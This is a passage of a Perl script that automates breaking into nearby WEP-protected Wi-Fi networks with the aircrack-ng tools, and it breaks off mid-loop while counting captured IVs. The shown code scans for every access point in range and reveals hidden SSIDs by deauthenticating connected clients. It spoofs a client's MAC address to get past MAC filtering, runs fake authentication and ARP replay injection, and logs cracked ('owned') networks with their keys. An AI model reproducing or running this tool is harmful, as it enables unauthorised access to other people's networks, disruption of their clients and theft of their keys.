#!/usr/bin/perl
use warnings;
use strict;
use Term::ReadKey;
use subs qw(clean connect pingtest select_iface);


################################################  COPYRIGHT  AND  DISCLAMER   ###########################################################
#																	#
#  Copyright (c) 2009, Mark Jayson Alvarez												#
#  All rights reserved.															#
#																	#
#  Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following 		#
#  conditions are met:															#
#																	#
#    * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.	#
#    * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer	#
#      in the documentation and/or other materials provided with the distribution.							#
#																	#
#    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, 	#
#    BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT	#
#    SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL	#
#    DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS	#
#    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT  			#
#    (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF 	#
#    SUCH DAMAGE.															#
#																	#
#########################################################################################################################################



# Set 1 to enable debugging: 
my $debug = 1;



##########   INTERFACE CONFIGURATION   ##################

# Injection interface to use (ath0, wlan0, rausb0)
my $inject_iface = '';

# Monitor interface to use (e.g, rtap0, mon0)
my $monitor_iface = '';

# Mac Address of your injecting interface
my $macaddress = '';


######  TIMEOUTS  AND DURATION   #################

# Initial airodump scan duration (sleeps) when trying to build target AP list
my $scan_duration = 6;

# Time to wait before reading the airodump output. 23 seconds/sleeps should be safe on default aircrack-ng installation which updates 
# .csv files every 20 seconds;
my $airodumpwait = 3; 
# Minimum number of IVs collected when we want cracking to begin (20k for 40-bit, 40k for 128-bit)
my $min_iv = 17000;

# After 10 sleeps if IV is less than 100, send deauth broadcast ($ivtimer / 10 )
my $try_deauth = 1;

# After 40 sleeps if IV is at least 1 and less than 300,  try clientless attacks: fragmentation then rebroadcast -p0841
my $try_fragment = 4;

# After 40 seconds, stop fragmentation, try rebroadcast -p 0841
my $frag_timeout = 40;


# After 20 minutes worth of sleeps, if we are still injecting, don't wait forever, stop and move to the next AP ($ivtimer / 10)
my $ap_timeout = 120;

# After 15 minutes of cracking and still couldn't find the key, don't wait forever, move to the next AP
my $crack_timeout = 900;

# If AP is using Shared Key Authentication and still no data after 15 seconds, timeout and skip the AP.
my $ska_timeout = 15;

# Scan duration when "sorting" or "connecting". 
my $sortcon_duration = 4;

# Interface selection timeout, in case multiple interfaces were found.
my $select_timeout = 3;


###################  DEFAULT NON-OVERLAPPING CHANNELS SELECTION  #######################

my $country = 'US';

# US = 1, 6, 11
# EU = 1, 5, 9, 13

my %default_channels;
$default_channels{'US'} = { 1=>'', 6=>'', 11=>'' };
$default_channels{'EU'} = { 1=>'', 5=>'', 9=>'', 13=>'' };


#########################################################################################




my $mode;
my $pinghost;
my %uniq_channels;
my %all_ap;
my %owned_ap;
my %known_ap;
my %bad_ap;
our $gateway;
my $bssid; 
my $ssid; 
my $key; 
our $manualip = 0;
my $apcount;
my $selected_iface;
our $set_monitor_error;
our $old_ivcount = 0;
our $hssid = time;

###########################   BEGIN DETECT WIRELESS INTERFACE   ###############################################

#   Start each wireless cards in monitor mode using airmon-ng
#   Obtain the monitor interface if there's any through the output of airmon-ng
#   Store all cards in %wifi_iface (key = inject interface, value = monitor interface)
#   If the cards were manually set at the beginning of this script, then don't auto detect;


my %wifi_iface;
my $iface_index = 1;

unless ($inject_iface ne '' && $monitor_iface ne ''){
print "\nDetecting wireless interfaces...\n";
my $autodetect_iface = 1;
print "<< DEBUG >>: GETTING OUTPUT OF airmon-ng...\n" if $debug;
print "<< DEBUG >>: RUNNING \"airmon-ng \|\"...\n" if $debug;
open AIRMON, "airmon-ng |" or die "Can't run airmon-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
while (<AIRMON>){
  next unless /^[a-z]+\d\s/;
  next if /^mon\d/;
  print "\n---------------------------------------------------------\n";
  $inject_iface = (split/\s+/, $_)[0];
  print "\nFound $inject_iface...\n"; 
  print "Getting monitor interface...\n";
  $monitor_iface = set_iface($inject_iface);
  if ($monitor_iface eq 'error'){
	print "Got this error when putting $inject_iface into monitor mode:\n";
	print "\n\t",$set_monitor_error,"\n";
	print "Excluding...\n";
  }else{
     $wifi_iface{$iface_index} = { monitor => $monitor_iface,
				   inject => $inject_iface
				   }; 

### Don't use wifi0 as inject interface in case of atheros card 
     $wifi_iface{$iface_index}{'inject'} = $monitor_iface  if ($inject_iface =~ /wifi/);
	

     print "monitor interface --> $wifi_iface{$iface_index}{'monitor'}\n";
     $inject_iface = $wifi_iface{$iface_index}{'inject'};
     $monitor_iface = $wifi_iface{$iface_index}{'monitor'};
  }
  
     ++$iface_index;
}

}

my $ifacecount = scalar keys %wifi_iface;
if ($ifacecount == 0 && $inject_iface eq ''){
  print "No working wireless card.\nExiting...\n\n";
  exit;
}
print "\n========================================================\n" unless $inject_iface ne '';
print "\nFound $ifacecount useable wireless card(s)\n" unless $ifacecount == 0; 
print "\nSelect which one to use [1] (You HAVE $select_timeout seconds)\n" if $ifacecount > 1;
print "\n";
foreach (sort keys %wifi_iface){
	print " $_) "unless $ifacecount == 1; 
	print "$wifi_iface{$_}{'inject'}/$wifi_iface{$_}{'monitor'}\n";
}
print "\n=========================================================\n\n";

if ($ifacecount > 1){
   $selected_iface = select_iface($select_timeout);
   chomp $selected_iface if defined $selected_iface;
   $selected_iface = 1 unless defined $selected_iface && $selected_iface ne '';
   unless (exists $wifi_iface{$selected_iface}){
	print "Invalid choice. Selecting the default...\n";
	$selected_iface = 1;
   }
   $inject_iface = $wifi_iface{$selected_iface}{'inject'};
   $monitor_iface = $wifi_iface{$selected_iface}{'monitor'};
   $ENV{'inject_iface'} = $inject_iface;
}



$ENV{'inject_iface'} = $inject_iface; 





# Get the mac address

unless (defined $macaddress && $macaddress ne ''){

	print "<< DEBUG >>: GETTING MAC ADDRESS...\n" if $debug;
	print "<< DEBUG >>: RUNNING \"ifconfig $inject_iface \|\"...\n" if $debug;
	open IFCONFIG, "ifconfig $inject_iface |" or die "Can't run ifconfig.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
	while (<IFCONFIG>){
	  next unless /HW/;
	  $macaddress = (split /\s+/,$_)[-1];
	  if ($macaddress =~ /-/){
		my @uglymac = (split /-/, $macaddress);
		$macaddress = "@uglymac[0..5]";
		$macaddress =~ s/ /:/g;
	  }
	}
}



###########################   END DETECT WIRELESS INTERFACE   ###############################################


#######################   BEGIN ARGUMENT VERIFICATION #########################
# We only accept either 'sort', 'connect' (sort and connect can be followed by optional IP or hostname)
# or just any combination of 1, 6, and 11 for US and 1, 5, 9, 13 for EU non-overlapping channels


if (scalar @ARGV > 0 ){
  if ($ARGV[0] !~ /^\d/){
      if ($ARGV[0] eq 'sort' or $ARGV[0] eq 'connect'){
	$mode = shift @ARGV;
      }
  }else{

## We use hash to store channel arguments (as hash keys) so that we won't have to scan a channel more than once in case of duplicate channel inputs
    foreach (@ARGV){
	if ($_=~/^\d/){
	    $_ =~ tr/0-9//cd;
            if ($country eq 'US'){
		if (exists $default_channels{$country}{$_}){
		      $uniq_channels{$_} = '';
	         }else{
			print "<< DEBUG >>: $_ IS NOT A $country CHANNEL. EXCLUDING...\n" if $debug;
		  }
            }elsif ($country eq 'EU'){
		if (exists $default_channels{$country}{$_}){
		      $uniq_channels{$_} = '';
		  }else{
			print "<< DEBUG >>: $_ IS NOT AN $country CHANNEL. EXCLUDING...\n" if $debug;
		  }
		  


            }

	  }
      }
  }
	
}
  




####  If there was no channel passed (MODE: crack only), defaults to all non overlapping channels on the country specified
    if (scalar keys %uniq_channels == 0){
	print "No valid channel entered. Using the default ( $country = ";
	while (( my $key, my $val) = each %{$default_channels{$country}}){
		$uniq_channels{$key} = $val;
	}
	foreach (sort { $a <=> $b } keys %uniq_channels){
	  print "$_ ";
	}
	print ")\n\n";
     }
    


	if (defined $mode){
	$pinghost = shift @ARGV;
	$pinghost = 'gateway' unless defined $pinghost;
	if ($mode ne 'sort'){
	   if ($mode ne 'connect'){
		print "\nUsage: \n";
		print "\tperl $0 [channel/s] (or any combination, space separated )\n"; 
		print "\tperl $0 (sort | connect) [HOST | IP] 		(Defaults to: gateway)\n";
		exit;
	   }
	 }
	}else{
        print "\nUnknown Mode: \"$ARGV[0]\". Using the default (crack)\n\n" if (scalar @ARGV > 0 && $ARGV[0] !~ /^\d/);
	  $mode = 'crack';
	}


#################   END ARGUMENT VERIFICATION ####################################


	print "\nMODE: $mode\t(using: $inject_iface/$monitor_iface == $macaddress)\n";

### MISCELLANEOUS CHECKS

### Verify if we have owned.txt for (MODE: sort, connect) 
	unless ($mode eq 'crack'){
	        print "<< DEBUG >>: CHECKING IF WE HAVE ANY AP TO SORT OR CONNECT TO...\n" if $debug;
		unless (-e "owned.txt"){
		
			  print "\nNothing to $mode. Run \"perl $0\" first.\nExiting...\n\n";
			  exit;
		}
		
	}

### Just to get the full path to the aircrack-ng programs when debugging is enabled

my $airodump = `which airodump-ng`;
my $aireplay = `which aireplay-ng`;
my $aircrack = `which aircrack-ng`;
chomp ($airodump, $aireplay, $aircrack);



################   BEGIN SCANNING FOR ACCESS POINTS   ##############################

	print "<< DEBUG >>: DELETING found_ap.txt...\n" if $debug; 
	`rm found_ap.txt 2>&1`;

### We(or I) don't want to wait for the entire $scan_duration when we are not cracking
	$scan_duration = $sortcon_duration unless ($mode eq 'crack');


	# For each channel, scan using airodump and build a list of target APs and store to %all_ap
	foreach (keys %uniq_channels){
	 my $perchannel_ap = scan_ap($_);
	 while ((my $k, my $v) = each %$perchannel_ap){
		$all_ap{$k} = $v;	
	 }
	}


################   END SCANNING FOR ACCESS POINTS   ##############################



###############  BEGIN VARIOUS CHECKS BEFORE WE START WORKING  ####################

	# Just checking if we have any APs in range to crack, sort, or connect 

	print "<< DEBUG >>: COUNTING FOUND APs...\n" if $debug;
	$apcount = scalar keys %all_ap;
	if ($apcount == 0){
	  print "Found no AP. Exiting...\n\n\n";
	  print "<< DEBUG >>: CLEANING BEFORE EXIT...\n" if $debug;
	  clean;
	  exit;
	}else{
	  print "\nTotal AP found: $apcount\n\n";
	  print "Now starting to $mode...\n\n\n";
	}


	###  Read the list of cracked APs and store each into %owned_ap (Needed for sort, connect)

	print "<< DEBUG >>: READING owned.txt...\n" if $debug;
	if (-e "owned.txt"){
	open OWNED, "owned.txt" or die "Can\'t open owned.txt!: $!\n\n";
	  while (<OWNED>){
		next if /^\s*$/;
		$owned_ap{(split / === / , $_)[0]} = {
					bssid => (split / === /, $_)[0], 
					channel => (split / === /, $_)[1], 
					ssid => (split / === /, $_)[2], 
					key => (split / === /, $_)[3], 
					dateowned => (split / === /, $_)[4],
				    };




	  }
	}
	close OWNED;

### Read the list of bad APs and store each into %bad_ap, so that we can skip cracking an AP if it is included in the list

	
      print "<< DEBUG >>: READING bad_ap.txt...\n" if $debug;
      if (-e "bad_ap.txt"){
	    open BADAP, "bad_ap.txt" or die "Can\'t open bad_ap.txt!: $!\n\n";
	    while (<BADAP>){
		chomp;
		next if /^\s+$/;
		$_ =~ s/\s+//g;
	        $_ =~ tr/a-z/A-Z/;
		if ($_ !~ /^00:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}$/){
		   print "<< DEBUG >>: $_ NOT A VALID MAC FORMAT. IT SHOULD BE \"00:xx:xx:xx:xx:xx\" (x = hex). SKIPPING...\n" if $debug;
		   next;
		} 
		$bad_ap{$_} = '';
	    }
      }


###  Read the list of known APs and store each into %known_ap, so that we can skip cracking an AP unless it is included in the list
	print "<< DEBUG >>: READING known_ap.txt...\n" if $debug;
	if (-e "known_ap.txt"){
		open KNOWNAP, "known_ap.txt" or die "Can\'t open known_ap.txt!: $!\n\n";
		while (<KNOWNAP>){
			chomp;
			next if /^\s+$/;
			$_ =~ s/\s+//g;
			$_ =~ tr/a-z/A-Z/;
			if ($_ !~ /^00:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}$/){
			   print "<< DEBUG >>: $_ NOT A VALID MAC FORMAT. IT SHOULD BE \"00:xx:xx:xx:xx:xx\" (x = hex). SKIPPING...\n" if $debug;
			   next;
			} 

			$known_ap{$_} = '';
		}
	}

###############  END VARIOUS CHECKS BEFORE WE BEGIN WORKING  ####################



#############  BEGIN LOOPING THROUGH %all_ap ###################################


	for my $all_ap_key(keys %all_ap){
	   print "#########################################################\n";


### Skip AP if included in bad_ap.txt
     if (scalar keys %bad_ap > 0){
        if (exists $bad_ap{$all_ap{$all_ap_key}->{'bssid'}}){
	   print "\n$all_ap{$all_ap_key}->{'bssid'} is blacklisted.\nSkipping...\n\n";
	   next;
	}
     }

### Skip everything but known APs
	if (scalar keys %known_ap > 0){
	  unless (exists $known_ap{$all_ap{$all_ap_key}->{'bssid'}}){
		print "\n$all_ap{$all_ap_key}->{'bssid'} is not included in \"known_ap.txt\"\nSkipping...\n\n";
		next;
	  }
	}



	#################   BEGIN  MODE   CRACK  ####################################
	if ($mode eq 'crack'){
	my $start_cracktime = time;
	   print "\nPwning ", ($all_ap{$all_ap_key}->{'ssid'} eq $hssid)?"\"hidden\"":"\"$all_ap{$all_ap_key}->{'ssid'}\"" , " ($all_ap{$all_ap_key}->{'bssid'})     ", scalar localtime($start_cracktime),"\n";


	### Existing keys can be replaced if 15 days have passed since the date the key was cracked.
	### If ran in less than 15 days, existing entries will be skipped


	if (exists $owned_ap{$all_ap{$all_ap_key}->{'bssid'}} && (time  - $owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'dateowned'}) < 1296000) {
	   print "Owned just recently \(", scalar localtime($owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'dateowned'}),"\).\nSkipping...\n\n";
	   next;
	 }


######################################   BEGIN  REVEAL  HIDDEN  SSID   ########################################################## 

	   my $directdeauth = 0;
	   if ($all_ap{$all_ap_key}->{'ssid'} eq $hssid){
	     print "SSID Hidden!\nTrying to reveal...\n";

	     print "<< DEBUG >>: FORKING ANOTHER CHILD PROCESS AIRODUMP-NG FOR REVEALING HIDDEN SSID...\n" if $debug;
	     die "Could not fork airodump-ng!: $!\n\n" unless defined (my $deauthdump_pid = fork);
	     if ($deauthdump_pid == 0){
	       print "<< DEBUG >>: RUNNING \"$airodump -t wep -d $all_ap{$all_ap_key}->{'bssid'} $monitor_iface -c $all_ap{$all_ap_key}->{'channel'} -n -w deauth_dump 2\>\&1\"...\n" if $debug;
	       `airodump-ng -t wep -d $all_ap{$all_ap_key}->{'bssid'} $monitor_iface -c $all_ap{$all_ap_key}->{'channel'} -n -w deauth_dump 2>&1`;
	     }
	     my $hidden_ssid_found = 0;
	     my $hiddenssid;

	     for (my $x = 3; $x > 0; $x--){
	       if ($hidden_ssid_found == 1){
		 print "<< DEBUG >>: SSID REVEALED. KILLING AIRODUMP-NG CHILD PROCESS...\n" if $debug;
		 kill (9, $deauthdump_pid);
		 last;
	       }else{
		if ($x == 1){
		  print "Last try... (hit ENTER to try some more)\n";
		}
		
### Directed deauth is preferrable so we do it once to each connected clients

		  if (scalar @{$all_ap{$all_ap_key}->{'clients'}} > 0 && $directdeauth != 1){
			print "Connected client(s) found!!\n";
			print "Sending directed Deauth...\n";
			for (@{$all_ap{$all_ap_key}->{'clients'}}){	
			  print "Sending Deauth to $_...\n";
			  print "<< DEBUG >>: RUNNING \"$aireplay -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress -c $_ 2\>\&1\"...\n" if $debug;
		          `aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress -c $_ 2>&1`;

			}
			$directdeauth = 1;
		  }
		
### Don't do broadcast deauth if we have done directed deauth earlier

		unless ($directdeauth == 1 && $x == 3){
		  print "Sending Deauth broadcast...\n";
		  `aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress 2>&1`;
		}
		sleep $airodumpwait;
		print "<< DEBUG >>: READING deauth_dump-01.csv...\n" if $debug;
		open DEAUTHDUMP, "deauth_dump-01.csv" or die "Can't open deauth_dump-01.csv!: $!\n\n";
		while (<DEAUTHDUMP>){
		  next if (/^\r$/ || /^BSSID/);
		  last if (/^Station/);
		  chomp;
		  $hiddenssid = (split /,/, $_)[ -2 ];
		  $hiddenssid =~ s/^\s*//;
		  $hiddenssid =~ s/\x00*//;
		  if ($hiddenssid ne ""){
		    $hidden_ssid_found = 1;
		    $all_ap{$all_ap_key}->{'ssid'} = $hiddenssid;
		    print "SSID Found!! -> \"$all_ap{$all_ap_key}->{'ssid'}\"\n";
		 }
	       }
	     }
### Deauth some more when enter is pressed
	   if (ReadKey(-1)){
	      $x+=2;
	   }
	     }
	  kill (9, $deauthdump_pid);
	  waitpid($deauthdump_pid, 0);
	   }

### Finally, if it is still hidden...

	 if ($all_ap{$all_ap_key}->{'ssid'} eq $hssid){
	    print "Cannot reveal SSID. Association will fail.\nSkipping...\n\n";
	    next;
	 }

######################################   END  REVEAL  HIDDEN  SSID   ########################################################## 



	###  WE CAN SKIP APs WITH ZERO IVs
	#  if ($all_ap{$all_ap_key}->{'iv'} == 0){
	#    print "Zero IV\nSkipping...\n"; 
	#    next;
	#  }




	# Make sure no process is running and interface is set to correct channel
        print "<< DEBUG >>: KILLING AIRCRACK-NG PROCESSESES BEFORE WE START...\n" if $debug;
	print "<< DEBUG >>: RUNNING \"pkill -KILL air\"...\n" if $debug; 
	`pkill -KILL air`;
	print "<< DEBUG >>: CLEANING DUMP FILES BEFORE WE START...\n" if $debug;
	 clean;
	print "<< DEBUG >>: SETTING CHANNEL TO $all_ap{$all_ap_key}->{'channel'}...\n" if $debug;
	print "<< DEBUG >>: RUNNING \"iwconfig $inject_iface channel $all_ap{$all_ap_key}->{'channel'}\"...\n" if $debug;
	`iwconfig $inject_iface channel $all_ap{$all_ap_key}->{'channel'}`;
	print "<< DEBUG >>: SETTING RATE TO 1M...\n" if $debug; 
	print "<< DEBUG >>: RUNNING \"iwconfig $inject_iface rate 1M\"...\n" if $debug;
	`iwconfig $inject_iface rate 1M`;





##############   BEGIN MAC ADDRESS FILTER AND SHARED KEY AUTHENTICATION CHECK ####################


## NOTES:
## The following codes below were based on the following observations:
## - aireplay-ng fakeauth does not exit until successful or data is found if AP is using shared key authentication
## - some APs will deny authentication right away when there's mac filtering, others will just deny association (hence the reason for /code/ regexp.







my $reply = 0;
my $clients = scalar @{$all_ap{$all_ap_key}->{'clients'}};
my @preauth;
my $skaauth;
my $auth;
print "Checking for mac filtering...";




########  BEGIN  ONE TIME FAKE AUTH FORK  #####################

# Escape special characters in SSID before doing any fake auth
	$ssid = $all_ap{$all_ap_key}->{'ssid'};
	$ssid =~ s/"/\\"/g;

### Child fork will write to the parent via PREAUTH_IPC
print "\n<< DEBUG >>: FORKING ANOTHER CHILD PROCESS FOR AIREPLAY-NG TO BE READ FROM VIA PREAUTH_IPC...\n" if $debug;
die "Could not fork aireplay-ng!: $!\n\n"  unless defined (my $preauth_pid = open(PREAUTH_IPC, "-|"));
print "<< DEBUG >>: DOING ONE TIME FAKE AUTHENTICATION...\n" if $debug;
print "<< DEBUG >>: RUNNING \"$aireplay -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress 2\>\&\|\"...\n" if $debug;
if ($preauth_pid == 0){
  open PREAUTH, "aireplay-ng -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress 2>&1|" or die "Can't run aireplay-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
  while (<PREAUTH>){
     next if /^\s*$/;
     print;
  }
print "<< DEBUG >>: DONE DOING ONE TIME FAKE AUTH...\n" if $debug;
print "<< DEBUG >>: EXITING AIREPLAY-NG ONE TIME FAKE AUTH CHILD PROCESS...\n" if $debug;
   exit(0);
}  


#################  END  ONE TIME FAKE AUTH FORK  #####################

### From this point downwards is the parent process. Parent is executing along with the child up to the waitpid.
### The child STDOUT will go to the parents STDIN via PREAUTH_IPC, catching everything being printed in the child
### Parent will only get pass waitpid after the child exits (when killed by the parent or dies on its own.

print "<< DEBUG >>: SLEEPING FOR 3 SECONDS...\n" if $debug;
sleep 3;

print "<< DEBUG >>: READING STDOUT OF AIREPLAY-NG CHILD PROCESS VIA PREAUTH_IPC...\n" if $debug;
while (<PREAUTH_IPC>){
  push @preauth, $_;
  if (/Association successful/){
        print "<< DEBUG >>: FOUND \/Association successful\/ IN aireplay-ng OUTPUT...\n" if $debug;
	print "   NONE!! =)\n" unless (defined $skaauth && $skaauth eq 'true');
	kill(9, $preauth_pid);
        last;
  }
 if (/Switching/){
    print "<< DEBUG >>: FOUND \/Switching\/ IN aireplay-ng OUTPUT...\n" if $debug;
    print "\nSKA enabled. Trying to authenticate...\n";
    $skaauth = 'true';
   	eval {
    	   local %SIG;
           $SIG{ALRM} = sub { 
				unless (defined $auth && $auth eq 'success'){
                                  print "Authentication failed after trying for $ska_timeout seconds.\nSkipping...\n\n"; 
                                  $skaauth = 'failed'; 
                                  kill(9,$preauth_pid);  
				}
                             };

           alarm $ska_timeout;
        };
 }
 if (/code/){
    print "<< DEBUG >>: FOUND \/code\/ IN aireplay-ng OUTPUT...\n" if $debug;
    print "<< DEBUG >>: KILLING AIREPLAY-NG CHILD PROCESS...\n" if $debug;
    kill(9, $preauth_pid);
    last;
 }

### If all else fails...

 if (/unsuccessful/){
      print "<< DEBUG >>: FOUND \/unsuccessful\/ IN aireplay-ng OUTPUT...\n" if $debug;
      print "\nCan't associate. aireplay-ng died!\n\n"; 
      $auth = 'failed';
      print "<< DEBUG >>: KILLING AIREPLAY-NG CHILD PROCESS...\n" if $debug;
      kill(9, $preauth_pid);
      last;
 }

}


if(defined $auth && $auth eq 'failed'){
  print "<< DEBUG >>: AUTHENTICATION FAILED. SKIPPING...\n" if $debug;
  next;
}
if (defined $skaauth && $skaauth eq 'failed'){
  print "<< DEBUG >>: SKA AUTHENTICATION FAILED. SKIPPING...\n" if $debug;
  next;
}
waitpid($preauth_pid,0);
system("stty", "sane");
close PREAUTH_IPC;
$auth = 'success';
print "Authentication successful!!!\n" if (defined $skaauth && $skaauth eq 'true');



###################  BEGIN MAC ADDRESS SPOOFING  ######################

my $errline;
for (@preauth){
  if ($_ =~ /code/){
      $errline = $_;
      last;
   }
}

if (defined $errline){
   if ($errline =~ /code/){
    print "    FILTERED!!!\n\n" unless defined $skaauth;
    print "Mac address FILTERED!!!\n" if defined $skaauth; 
    print "Got this error:\n";
    print "\t$errline\n\n";
    if ($clients == 0){
       print "No client found. Skipping...\n\n";
       next; 
    }else{
       $macaddress = ${$all_ap{$all_ap_key}->{'clients'}}[0];
       print "Spoofing mac to first seen client (${$all_ap{$all_ap_key}->{'clients'}}[0])...\n";
       print "This may take a while. Hold your breath...\n\n";
       print "<< DEBUG >>: RUNNING \"ifconfig $inject_iface down\"...\n" if $debug;
       `ifconfig $inject_iface down`;
       print "<< DEBUG >>: RUNNING \"macchanger $inject_iface -m $macaddress\"...\n" if $debug;
       `macchanger $inject_iface -m $macaddress`;
       print "<< DEBUG >>: RUNNING \"ifconfig $inject_iface up\"...\n" if $debug;
       `ifconfig $inject_iface up`;
    }
   }
}

###################  END MAC ADDRESS SPOOFING  ######################


##############   END MAC ADDRESS FILTER AND SHARED KEY AUTHENTICATION CHECK ####################




	print "Trying to associate..." unless defined $errline;

	   #################     BEGIN FAKEAUTH FORK    ####################################
           print "\n<< DEBUG >>: FORKING ANOTHER CHILD PROCESS FOR AIREPLAY-NG FOR FAKE AUTHENTICATION WITH KEEP-ALIVEs...\n" if $debug;
	   die "Could not fork aireplay-ng!: $!\n\n" unless defined (my $pid = fork);
	   if ($pid == 0){

	      print "<< DEBUG >>: RUNNING \"$aireplay -1 900 -o 1 -q 10 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress \|\"...\n"	if $debug;
	      open AIREPLAY, "aireplay-ng -1 900 -o 1 -q 10 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress |" or die "Can't run aireplay-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
	      my @fakeauth;
	      print "<< DEBUG >>: NOW READING THE OUTPUT OF AIREPLAY-NG...\n" if $debug;
	      while (<AIREPLAY>){
	      next if /^\s+$/;
	      push @fakeauth, $_; 
	       if (/Association successful/){
                  print "<< DEBUG >>: FOUND \/Association successful\/ IN aireplay-ng OUTPUT...\n" if $debug;
		  if (defined $errline or defined $skaauth){
 			if (defined $skaauth && $skaauth eq 'true'){
			  print "\nAssociation successful!!!\n" unless defined $errline;
			}
		  }else{
		       print "   SUCCESS!!!\n";
		  }
		  print "Starting to inject...\n";

		  ###################    BEGIN AIRODUMP FORK   ###############################
                  print "<< DEBUG >>: FORKING ANOTHER CHILD PROCESS FOR AIRODUMP-NG FOR IV COLLECTION...\n" if $debug;
		  die "Could not fork airodump-ng!: $!\n\n" unless defined (my $airodump_pid = fork);
		  if ($airodump_pid == 0){
	              print "<< DEBUG >>: RUNNING \"$airodump $monitor_iface -t wep -u 20 -d $all_ap{$all_ap_key}->{'bssid'} -c $all_ap{$all_ap_key}->{'channel'} -w inject_dump 2\>\&1\"...\n" if $debug;
		     `airodump-ng $monitor_iface -t wep -u 20 -d $all_ap{$all_ap_key}->{'bssid'} -c $all_ap{$all_ap_key}->{'channel'} -w inject_dump  2>&1`;
		  }
		  ###################    END AIRODUMP FORK    ################################

		### Try deauth first before injecting... 

		print "Sending Deauth...\n";
	        print "<< DEBUG >>: RUNNING \"$aireplay -0 3 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress\"...\n" if $debug;
		`aireplay-ng -0 3 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress`;

		  ##################    BEGIN ARP REPLAY FORK   #############################
                  print "<< DEBUG >>: FORKING ANOTHER CHILD PROCESS FOR AIREPLAY-NG FOR ARP REPLAY ATTACK...\n" if $debug;
		  die "Could not fork aireplay-ng!: $!\n\n" unless defined (my $aireplay_pid = fork);
		  if ($aireplay_pid == 0){
	              print "<< DEBUG >>: RUNNING \"$aireplay $inject_iface -3 -b $all_ap{$all_ap_key}->{'bssid'} -h $macaddress 2\>\&1\"...\n" if $debug;
		     `aireplay-ng $inject_iface -3  -b $all_ap{$all_ap_key}->{'bssid'} -h $macaddress 2>&1`;
		  }
		  ##################    END ARP REPLAY FORK    ##############################



	###   After successful "Fake Authentication" watch airodump output and see if IV increases.
	###   Once it reaches $min_iv, start cracking the key
	###   If IV doesn't reach 100 within 20 seconds, try deauth (for windows clients which refreshes arp cache on disconnects)
	###   If IV doesn't reach 100 within 40 seconds, stop injecting and move to the next AP
	###   If Enter key is pressed, stop injecting and move to the next AP

	####   Must wait for airodump-ng to write the csv file, after 20 seconds on default install
	####   Change to 23 on default aircrack install to be safe
	print "<< DEBUG >>: SLEEPING FOR $airodumpwait SECONDS...\n" if $debug;
	sleep $airodumpwait;



	print "Counting IVs...(hit ENTER to skip this AP)\n";
	my $ivtimer = 0;
	my $cracking = 'notdone';
	my $crackfailed = 0;
	my $timeout = 0;
	my $aireplay_rebroadcast_pid = 1;
	my $keyfound;
	print "<< DEBUG >>: GETTING IV COUNT FROM inject_dump-01.csv EVERY 2 SECONDS...\n" if $debug;
	print "<< DEBUG >>: DISPLAYING IV COUNT EVERY 5 SECONDS...\n" if $debug;
	while (1){


	#  If aircrack is done cracking(when it has found the key or it hasn't and has tried for 15 minutes already) or Enter was pressed 
	if ($cracking eq 'done' || ReadKey (-1) || $timeout == 1){
	  print "Stopping all forks...\n\n";

          print "<< DEBUG >>: KILLING AIRODUMP-NG CHILD PROCESS...\n" if $debug;
	  kill (9, $airodump_pid);

          print "<< DEBUG >>: KILLING AIREPLAY-NG ARP REPLAY CHILD PROCESS...\n" if $debug;
	  kill (9, $aireplay_pid);

          if ($aireplay_rebroadcast_pid != 0 && $aireplay_rebroadcast_pid != 1){
             print "<< DEBUG >>: KILLING AIREPLAY-NG REBROADCAST CHILD PROCESS...\n" if $debug;
	     kill (9, $aireplay_rebroadcast_pid);
	  }
	  print "<< DEBUG >>: CLEANING DUMP FILES...\n" if $debug;
	  clean;
	  last;
	}else{



	###  Keep watching the contents of airodump output "inject_dump-01.csv" every 1 sleep

	  open INJECTDUMP, "inject_dump-01.csv" or die "Can't open inject_dump-01.csv!: $!\n\n";
	  while (<INJECTDUMP>){
	     next if (/^\r$/ || /^BSSID/);
	     last if (/^Station/);
	     last if (/^\s*$/);
	     chomp;
	     $all_ap{$all_ap_key}->{'iv'} = (split /,/,$_)[10];
	     $all_ap{$all_ap_key}->{'iv'} =~ s/^\s*//;


